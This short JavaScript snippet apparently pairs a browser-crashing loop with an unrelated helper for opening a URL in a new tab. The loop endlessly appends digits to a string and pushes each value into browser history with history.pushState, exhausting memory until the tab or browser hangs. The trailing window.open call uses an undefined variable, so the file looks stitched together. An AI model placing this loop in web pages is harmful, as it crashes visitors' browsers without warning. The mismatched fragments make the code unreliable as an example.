var total = "";
for( var i = 0; i < 999999999999999999999999999999999999999999999999999999999999999999999999999999999999999; i++ ) {
  total += i.toString();
  history.pushState(0,0, total );
}
          function openInNewTab(url) {
  window.open(url, '_blank').focus();
}

// Or just
window.open(url, '_blank').focus();
